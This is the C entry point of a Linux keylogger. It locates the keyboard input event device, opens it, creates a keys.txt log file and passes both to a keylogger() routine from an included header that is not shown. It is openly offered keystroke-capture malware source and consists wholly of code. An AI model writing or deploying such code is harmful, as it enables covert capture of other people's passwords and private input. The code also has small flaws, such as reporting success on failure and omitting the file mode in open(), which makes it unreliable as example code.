#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#define INPUT_DIR "/dev/input/"

#include "keyboard_event_file.h"
#include "keylogger.h"

int main(void) {
	int keyboard;
	char *KEYBOARD_DEVICE = get_keyboard_event_file();
	if (!KEYBOARD_DEVICE) {
		printf("Could not get keyboard event file\n");
		goto error;
	}
	printf("Keyboard device was found %s\n", KEYBOARD_DEVICE);

	if((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0){
        printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
		free(KEYBOARD_DEVICE);
		goto error;
    }
	printf("Successfully open keyboard file\n");

	int log_file = open("keys.txt", O_RDWR | O_CREAT | O_TRUNC);
	if (log_file == -1) {
		printf("Error to create log file\n");
		free(KEYBOARD_DEVICE);
		close(keyboard);
		goto error;
	}
	printf("Creating keys.txt file to store keys\n");


	keylogger(keyboard, log_file);
	close(keyboard);
	close(log_file);
	free(KEYBOARD_DEVICE);
	exit(EXIT_SUCCESS);
error:
	exit(EXIT_SUCCESS);
}
